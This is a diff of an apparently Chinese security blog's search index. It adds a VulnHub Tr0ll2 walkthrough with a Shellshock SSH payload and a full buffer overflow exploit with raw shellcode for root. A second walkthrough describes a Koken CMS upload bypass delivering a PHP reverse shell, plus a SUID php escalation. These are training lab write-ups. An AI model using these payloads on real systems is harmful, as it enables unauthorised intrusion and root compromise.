@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Tr0ll2：shellshock漏洞利用与缓冲区溢出提权</title>
+      <link href="/posts/ac2d18bb.html"/>
+      <url>/posts/ac2d18bb.html</url>
+      
+        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">靶机地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描</p><p><img src="/posts/ac2d18bb/image-20230510160823434.png"></p><p>80端口</p><p><img src="/posts/ac2d18bb/image-20230510164212434.png" alt="又是他"></p><p><img src="/posts/ac2d18bb/image-20230510164335662.png" alt="目录"></p><p><img src="/posts/ac2d18bb/image-20230510164526823.png" alt="rebots"></p><p>以上目录的其中一些，会返回这张图片</p><p><img src="/posts/ac2d18bb/image-20230510171027263.png"></p><p>这些图片看似一样，但是却可以发现，其中一张更大一点，用strings查看其中隐藏的信息：</p><p><img src="/posts/ac2d18bb/image-20230510171501171.png"></p><p>找到新的目录名：</p><p><img src="/posts/ac2d18bb/image-20230510171548019.png"></p><p><img src="/posts/ac2d18bb/image-20230510171624352.png"></p><p>下载这个answer.txt，发现里面全是base64编码的字符串，对其进行解密：</p><p><img src="/posts/ac2d18bb/image-20230510171746290.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> answer.txt <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> answer1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密出的字符串有很多重复的，用以下命令去重：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uniq</span> <span class="token parameter variable">-u</span> answer1.txt <span class="token operator">></span> answer2.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然而，这4w多条不是用在ftp登录爆破上的，但是不白费，后面会用到。</p><p><img src="/posts/ac2d18bb/image-20230510172528768.png"></p><p>还是尝试21端口，这次用anonymous用户登录失败，这时首先想到的是靶机作者名，注意首页源代码里的这个提示，此外这也是靶机名。</p><p><img src="/posts/ac2d18bb/image-20230510172727654.png"></p><p>用Tr0ll：Tr0ll登录ftp成功。看来做这个系列的靶机不能纯靠技术还需要站在作者角度的巧思，他并不想我们花费大量的时间去爆破，而是从线索中大胆假设，靠猜！</p><p><img src="/posts/ac2d18bb/image-20230510173031367.png"></p><p>把lmao.zip下载到本地。</p><p><img src="/posts/ac2d18bb/image-20230510173126217.png"></p><h2 id="2-fcrackzip爆破加密的zip文件"><a href="#2-fcrackzip爆破加密的zip文件" class="headerlink" title="2.fcrackzip爆破加密的zip文件"></a>2.fcrackzip爆破加密的zip文件</h2><p>从ftp下载的文件加了密码，需要用<a href="https://www.kali.org/tools/fcrackzip/">fcrackzip工具解密</a></p><p><img src="/posts/ac2d18bb/image-20230510174055653.png"></p><p>之前获取的answer文档发挥作用了，用它来做破解的字典。</p><p><img src="/posts/ac2d18bb/image-20230510174340605.png"></p><p>破解成功！密码是：<strong>ItCantReallyBeThisEasyRightLOL</strong></p><p>查看解密出的文件noob，发现它是私钥文件</p><p><img src="/posts/ac2d18bb/image-20230510174647984.png"></p><h2 id="3-利用shellshock漏洞获取shell"><a href="#3-利用shellshock漏洞获取shell" class="headerlink" title="3.利用shellshock漏洞获取shell"></a>3.利用shellshock漏洞获取shell</h2><p>用ssh连接靶机，但是报错：sign_and_send_pubkey: no mutual signature supported。原因是<code>SHA-1</code>算法不安全，新版本的<code>openssh</code>已经禁用了，所以要加上参数-o PubkeyAcceptedKeyTypes&#x3D;+ssh-rsa</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> noob@192.168.56.8 <span class="token parameter variable">-i</span> noob <span class="token parameter variable">-o</span> <span class="token assign-left variable">PubkeyAcceptedKeyTypes</span><span class="token operator">=</span>+ssh-rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511085450879.png"></p><p>但是连接被远程靶机关闭，加-v参数查看细节信息。</p><p><img src="/posts/ac2d18bb/image-20230511085736294.png"></p><p>看到打印出debug1: Remote: Forced command.它通常容易受到shellshock攻击。</p><p>使用以下命令来确定是否存在 Shellshock 漏洞。如果执行 echo 命令并打印出“Shellshock”，则表示漏洞存在。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> noob@192.168.56.8 <span class="token parameter variable">-i</span> noob <span class="token parameter variable">-o</span> <span class="token assign-left variable">PubkeyAcceptedKeyTypes</span><span class="token operator">=</span>+ssh-rsa  <span class="token string">'() &#123; :;&#125;; echo Shellshock'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511091638158.png"></p><p>漏洞存在，修改echo命令为“&#x2F;bin&#x2F;bash”，获得noob用户的shell。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> noob@192.168.56.8 <span class="token parameter variable">-i</span> noob <span class="token parameter variable">-o</span> <span class="token assign-left variable">PubkeyAcceptedKeyTypes</span><span class="token operator">=</span>+ssh-rsa  <span class="token string">'() &#123; :;&#125;; /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511092007149.png"></p><pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转为交互shell。</p><h2 id="4-利用缓冲区溢出提权"><a href="#4-利用缓冲区溢出提权" class="headerlink" title="4.利用缓冲区溢出提权"></a>4.利用缓冲区溢出提权</h2><p>运行 find 命令来查找任何 setuid 目录&#x2F;文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511092546047.png"></p><p>我们感兴趣的目录是这“三扇门”，有三个r00t程序。（这三个程序每隔一段时间会换目录）</p><p>door1中的程序关闭ssh连接。</p><p><img src="/posts/ac2d18bb/image-20230511093719604.png" alt="door1"></p><p>door3中的程序权限封锁两分钟。</p><p><img src="/posts/ac2d18bb/image-20230511093819367.png"></p><p>只有door2的程序要求带参数输入：</p><p><img src="/posts/ac2d18bb/image-20230511093910781.png"></p><p>看到要求用户输入，首先想到的是缓冲区溢出。先来检测下是否存在缓冲区溢出漏洞，输入500个A：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;r00t $(python -c &#39;print &quot;A&quot;*500&#39;) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现了“段错误”，表明存在缓冲区溢出。</p><p><img src="/posts/ac2d18bb/image-20230511094119041.png"></p><p>缓冲区溢出的靶机较少，流程已经忘得差不多了，以下是缓冲区溢出漏洞利用基本思路：</p><ul><li>利用代码进行fuzz找出是否存在缓冲区溢出漏洞（即查看能否控制EIP）</li><li>确定偏移量</li><li>确定返回地址</li><li>生成shellcode</li></ul><p>目前已确认存在缓冲区溢出漏洞，下一步是确定偏移量</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><p>首先利用msf-pattern_create创建长度为500的随机字符串</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create <span class="token parameter variable">-l</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511095147325.png"></p><p>然后用GDB调试程序，将上述随机字符串作为输入，确认程序崩溃时EIP的值：</p><p><img src="/posts/ac2d18bb/image-20230511095550418.png"></p><p>EIP的值为0x6a413969。利用msf-pattern_offset 工具确认偏移位置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_offset <span class="token parameter variable">-l</span> <span class="token number">500</span> <span class="token parameter variable">-q</span> 6a413969<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>偏移量为268</p><p><img src="/posts/ac2d18bb/image-20230511095847729.png"></p><h3 id="确定返回地址"><a href="#确定返回地址" class="headerlink" title="确定返回地址"></a>确定返回地址</h3><p>控制EIP跳转至shellcode，需要将shellcode设置到ESP地址。但在此之前，我们需要找到一个可靠的 ESP 地址。需要注意的是，OS 加载器将环境变量放在变化的堆栈区域之前，因此它会直接影响 ESP 地址。此外，如何调用程序也很重要。</p><p>通过取消设置环境变量参数LINES 和 COLUMNS来取消环境变量的影响，获取真实的ESP地址。</p><p>依次执行以下命令，其中”\0x90”*16为16个nop，即保护shellcode的nop雪橇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> - gdb r00tshow <span class="token function">env</span><span class="token builtin class-name">unset</span> <span class="token function">env</span> <span class="token environment constant">LINES</span><span class="token builtin class-name">unset</span> <span class="token function">env</span> <span class="token environment constant">COLUMNS</span>r <span class="token variable"><span class="token variable">$(</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "A"*268+"B"*4+"\0x90"*16+"C"*100'</span><span class="token variable">)</span></span>info registers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511103417729.png"></p><p>确认返回地址为0xbffffc80，小端序应写为\x80\xfc\xff\xbf</p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>使用 msfvenom 生成 shellcode，排除以下常见的坏字符</p><ul><li>\x00: 空字节</li><li>\x0a: 换行</li><li>\x0d: 回车</li></ul><p>这些坏字符可以破坏 shellcode 并导致漏洞利用失败。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x86/exec <span class="token parameter variable">-f</span> py <span class="token assign-left variable">CMD</span><span class="token operator">=</span><span class="token string">"/bin/sh"</span> <span class="token parameter variable">-b</span> <span class="token string">'\x00\x0a\x0d'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/ac2d18bb/image-20230511103949331.png"></p><p>生成shellcode后，执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">env - .&#x2F;r00t $(python -c &#39;print &quot;A&quot; * 268 + &quot;\x80\xfc\xff\xbf&quot; + &quot;\x90&quot; * 16 + &quot;\xb8\xc3\xc3\x08\xdf\xda\xd7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0b\x31\x42\x15\x03\x42\x15\x83\xea\xfc\xe2\x36\xa9\x03\x87\x21\x7c\x72\x5f\x7c\xe2\xf3\x78\x16\xcb\x70\xef\xe6\x7b\x58\x8d\x8f\x15\x2f\xb2\x1d\x02\x27\x35\xa1\xd2\x17\x57\xc8\xbc\x48\xe4\x62\x41\xc0\x59\xfb\xa0\x23\xdd&quot;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功，获取root权限！</p><p><img src="/posts/ac2d18bb/image-20230511105408088.png"></p><p>成功拿到flag！</p><p><img src="/posts/ac2d18bb/image-20230511105446667.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> walkthrough </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Tr0ll1：利用ftp匿名账户从pcap文件里获取信息</title>
       <link href="/posts/14cf182c.html"/>
       <url>/posts/14cf182c.html</url>
@@ -20,9 +47,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -47,9 +74,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -74,9 +101,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -101,9 +128,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -128,9 +155,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -182,9 +209,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -209,9 +236,9 @@
       
         <tags>
             
-            <tag> oscp </tag>
-            
             <tag> hackthebox </tag>
+            
+            <tag> oscp </tag>
             
         </tags>
       
@@ -236,9 +263,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -263,9 +290,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -290,9 +317,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -317,9 +344,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -344,9 +371,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -371,9 +398,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -398,9 +425,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -425,9 +452,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -452,9 +479,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -479,9 +506,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -506,9 +533,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -533,9 +560,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -560,9 +587,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -587,9 +614,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -614,9 +641,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -629,7 +656,7 @@
       <link href="/posts/d117200a.html"/>
       <url>/posts/d117200a.html</url>
       
-        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p><p>这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：<a href="https://blog.csdn.net/qq_43342566/article/details/102679837?spm=1001.2101.3001.6650.3">配置方法</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>地址信息</p><p>靶机地址：10.0.2.100</p><p>kali地址：10.0.2.102</p><p>nmap扫描开放端口和服务：</p><pre class="line-numbers language-none"><code class="language-none">nmap -A -sV 10.0.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130100955815.png"></p><p>开放端口信息</p><ul><li>80：http webserver  Apache httpd 2.4.18 (Ubuntu)</li><li>139 ：netbios-ssn Samba smbd 3.X - 4.X</li><li>445：netbios-ssn Samba smbd 4.3.11-Ubuntu</li><li>8000 ：http webserver Koken CMS</li></ul><p>测试思路</p><ul><li>80和8000端口：功能点测试、审查源码、JS文件、目录扫描</li><li>139和455端口：SMB协议枚举，利用已知漏洞</li></ul><h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>80端口：一个漂亮的网页，查看源码无发现。</p><p><img src="/posts/d117200a/image-20221129155203914.png"></p><p>8000端口：这是一个由名为koken的内容管理系统（CMS）搭建的。</p><p><img src="/posts/d117200a/image-20221129155230114.png"></p><p>通过目录扫描，发现了管理员登录界面。</p><p><img src="/posts/d117200a/image-20221129160601357.png"></p><h2 id="3-SMB协议枚举"><a href="#3-SMB协议枚举" class="headerlink" title="3.SMB协议枚举"></a>3.SMB协议枚举</h2><p>从端口扫描可以看到靶机系统为ubuntu，139和445端口利用samba实现在linux系统上的SMB协议。</p><p>使用<a href="https://www.kali.org/tools/enum4linux/">enum4linux</a>工具对目标Linux系统进行枚举.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">10.0</span>.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130105543201.png"></p><p>扫描结果显示“sambashare”共享可用，可以作为切入点。</p><p>继续查看enum4linux的输出，发现两个用户：daisa和agi。</p><p><img src="/posts/d117200a/image-20221130110250610.png"></p><p>尝试连接sambashare，先匿名登录，如果不行可能会用到上面两个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">''</span> //10.0.2.100/sambashare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sambashare在无用户名和密码的情况下成功连接：</p><p><img src="/posts/d117200a/image-20221130110641601.png"></p><p>查看文件，里面有两个文件：一个txt文件，另一个似乎是wordpress的备份文件。</p><p>先查看txt文件看能否获取信息，再考虑比较复杂的wordpress文件。</p><p><img src="/posts/d117200a/image-20221130111204807.png"></p><p>txt文件内容貌似是一封信：</p><p><img src="/posts/d117200a/image-20221130111257519.png"></p><p>从信里的信息可以猜测，<strong>邮箱：<a href="mailto:&#100;&#x61;&#105;&#x73;&#97;&#x40;&#112;&#x68;&#111;&#x74;&#x6f;&#103;&#x72;&#97;&#112;&#x68;&#x65;&#x72;&#46;&#99;&#x6f;&#x6d;">&#100;&#x61;&#105;&#x73;&#97;&#x40;&#112;&#x68;&#111;&#x74;&#x6f;&#103;&#x72;&#97;&#112;&#x68;&#x65;&#x72;&#46;&#99;&#x6f;&#x6d;</a>，密码：babygirl</strong></p><p>用这个账密信息尝试登录koken管理员界面:<a href="http://10.0.2.100:8000/admin">http://10.0.2.100:8000/admin</a></p><p><img src="/posts/d117200a/image-20221130111757995.png" alt="登录成功"></p><h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>现在可以以管理员身份登录Koken CMS系统，搜一下这个系统的漏洞。</p><p>存在一个<a href="https://www.exploit-db.com/exploits/48706">任意文件上传漏洞</a> ，漏洞描述：Koken CMS的上传限制基于允许的文件扩展名列表(withelist)，这有助于通过Burp处理HTTP请求来进行绕过。</p><p>利用步骤：</p><p>1）创建恶意PHP文件，这里使用的是kali系统目录 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php下的php反弹shell文件，把ip地址和端口分别修改为kali的ip和监听端口。</p><p><img src="/posts/d117200a/image-20221130140749360.png"></p><p>2）保存为 “image.php.jpg”.</p><p>3）登录Koken系统，在首页Library标签中点击“Import Content”按钮上传文件，并用burp拦截。</p><p><img src="/posts/d117200a/image-20221130141431892.png"></p><p><img src="/posts/d117200a/image-20221130141624609.png" alt="burp拦截"></p><p>4）在burp中修改文件名为“image.php”再重放。</p><p><img src="/posts/d117200a/image-20221130144449082.png" alt="标记的两处都要改"></p><p>5）在content页面，查看已经上传的php文件。</p><p><img src="/posts/d117200a/image-20221130144838277.png"></p><p>6）在kali中监听端口，触发文件链接，反弹shell成功！</p><p><img src="/posts/d117200a/image-20221130145035971.png"></p><p>查看当前权限，为www-data站点用户，进入&#x2F;home&#x2F;daisa目录，user.txt任何用户可查看，得到普通用户user.txt</p><p><img src="/posts/d117200a/image-20221130145605649.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>检查是否存在<strong>suid权限文件</strong>，suid权限的作用是允许用户以其所有者的权限执行文件，因此如果有可以让普通用户执行的属于root的文件，即可获取root权限。</p><p>用以下命令查找suid权限文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130150718574.png"></p><p>发现php7.2有suid权限，查找<a href="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a>，用以下命令提权。</p><p><img src="/posts/d117200a/image-20221130151011473.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/php7.2 <span class="token parameter variable">-r</span> <span class="token string">"pcntl_exec('/bin/bash', ['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获取root权限！</p><p><img src="/posts/d117200a/image-20221130151442420.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>靶机考察的知识点：</p><ul><li>公开的samba共享泄露账密等信息；</li><li>利用CMS系统任意文件上传漏洞反弹shell；</li><li>利用suid权限文件提权。</li></ul>]]></content>
+        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p><p>这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：<a href="https://blog.csdn.net/qq_43342566/article/details/102679837?spm=1001.2101.3001.6650.3">配置方法</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>地址信息</p><p>靶机地址：10.0.2.100</p><p>kali地址：10.0.2.102</p><p>nmap扫描开放端口和服务：</p><pre class="line-numbers language-none"><code class="language-none">nmap -A -sV 10.0.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130100955815.png"></p><p>开放端口信息</p><ul><li>80：http webserver  Apache httpd 2.4.18 (Ubuntu)</li><li>139 ：netbios-ssn Samba smbd 3.X - 4.X</li><li>445：netbios-ssn Samba smbd 4.3.11-Ubuntu</li><li>8000 ：http webserver Koken CMS</li></ul><p>测试思路</p><ul><li>80和8000端口：功能点测试、审查源码、JS文件、目录扫描</li><li>139和455端口：SMB协议枚举，利用已知漏洞</li></ul><h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>80端口：一个漂亮的网页，查看源码无发现。</p><p><img src="/posts/d117200a/image-20221129155203914.png"></p><p>8000端口：这是一个由名为koken的内容管理系统（CMS）搭建的。</p><p><img src="/posts/d117200a/image-20221129155230114.png"></p><p>通过目录扫描，发现了管理员登录界面。</p><p><img src="/posts/d117200a/image-20221129160601357.png"></p><h2 id="3-SMB协议枚举"><a href="#3-SMB协议枚举" class="headerlink" title="3.SMB协议枚举"></a>3.SMB协议枚举</h2><p>从端口扫描可以看到靶机系统为ubuntu，139和445端口利用samba实现在linux系统上的SMB协议。</p><p>使用<a href="https://www.kali.org/tools/enum4linux/">enum4linux</a>工具对目标Linux系统进行枚举.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">10.0</span>.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130105543201.png"></p><p>扫描结果显示“sambashare”共享可用，可以作为切入点。</p><p>继续查看enum4linux的输出，发现两个用户：daisa和agi。</p><p><img src="/posts/d117200a/image-20221130110250610.png"></p><p>尝试连接sambashare，先匿名登录，如果不行可能会用到上面两个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">''</span> //10.0.2.100/sambashare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sambashare在无用户名和密码的情况下成功连接：</p><p><img src="/posts/d117200a/image-20221130110641601.png"></p><p>查看文件，里面有两个文件：一个txt文件，另一个似乎是wordpress的备份文件。</p><p>先查看txt文件看能否获取信息，再考虑比较复杂的wordpress文件。</p><p><img src="/posts/d117200a/image-20221130111204807.png"></p><p>txt文件内容貌似是一封信：</p><p><img src="/posts/d117200a/image-20221130111257519.png"></p><p>从信里的信息可以猜测，<strong>邮箱：<a href="mailto:&#100;&#x61;&#105;&#x73;&#x61;&#64;&#112;&#x68;&#111;&#116;&#x6f;&#x67;&#x72;&#97;&#x70;&#104;&#x65;&#x72;&#46;&#99;&#111;&#109;">&#100;&#x61;&#105;&#x73;&#x61;&#64;&#112;&#x68;&#111;&#116;&#x6f;&#x67;&#x72;&#97;&#x70;&#104;&#x65;&#x72;&#46;&#99;&#111;&#109;</a>，密码：babygirl</strong></p><p>用这个账密信息尝试登录koken管理员界面:<a href="http://10.0.2.100:8000/admin">http://10.0.2.100:8000/admin</a></p><p><img src="/posts/d117200a/image-20221130111757995.png" alt="登录成功"></p><h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>现在可以以管理员身份登录Koken CMS系统，搜一下这个系统的漏洞。</p><p>存在一个<a href="https://www.exploit-db.com/exploits/48706">任意文件上传漏洞</a> ，漏洞描述：Koken CMS的上传限制基于允许的文件扩展名列表(withelist)，这有助于通过Burp处理HTTP请求来进行绕过。</p><p>利用步骤：</p><p>1）创建恶意PHP文件，这里使用的是kali系统目录 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php下的php反弹shell文件，把ip地址和端口分别修改为kali的ip和监听端口。</p><p><img src="/posts/d117200a/image-20221130140749360.png"></p><p>2）保存为 “image.php.jpg”.</p><p>3）登录Koken系统，在首页Library标签中点击“Import Content”按钮上传文件，并用burp拦截。</p><p><img src="/posts/d117200a/image-20221130141431892.png"></p><p><img src="/posts/d117200a/image-20221130141624609.png" alt="burp拦截"></p><p>4）在burp中修改文件名为“image.php”再重放。</p><p><img src="/posts/d117200a/image-20221130144449082.png" alt="标记的两处都要改"></p><p>5）在content页面，查看已经上传的php文件。</p><p><img src="/posts/d117200a/image-20221130144838277.png"></p><p>6）在kali中监听端口，触发文件链接，反弹shell成功！</p><p><img src="/posts/d117200a/image-20221130145035971.png"></p><p>查看当前权限，为www-data站点用户，进入&#x2F;home&#x2F;daisa目录，user.txt任何用户可查看，得到普通用户user.txt</p><p><img src="/posts/d117200a/image-20221130145605649.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>检查是否存在<strong>suid权限文件</strong>，suid权限的作用是允许用户以其所有者的权限执行文件，因此如果有可以让普通用户执行的属于root的文件，即可获取root权限。</p><p>用以下命令查找suid权限文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130150718574.png"></p><p>发现php7.2有suid权限，查找<a href="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a>，用以下命令提权。</p><p><img src="/posts/d117200a/image-20221130151011473.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/php7.2 <span class="token parameter variable">-r</span> <span class="token string">"pcntl_exec('/bin/bash', ['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获取root权限！</p><p><img src="/posts/d117200a/image-20221130151442420.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>靶机考察的知识点：</p><ul><li>公开的samba共享泄露账密等信息；</li><li>利用CMS系统任意文件上传漏洞反弹shell；</li><li>利用suid权限文件提权。</li></ul>]]></content>
       
       
       <categories>
@@ -641,9 +668,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -668,9 +695,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
             <tag> oscp </tag>
+            
+            <tag> vulnhub </tag>
             
         </tags>
       
@@ -695,9 +722,9 @@
       
         <tags>
             
-            <tag> vulnhub </tag>
-            
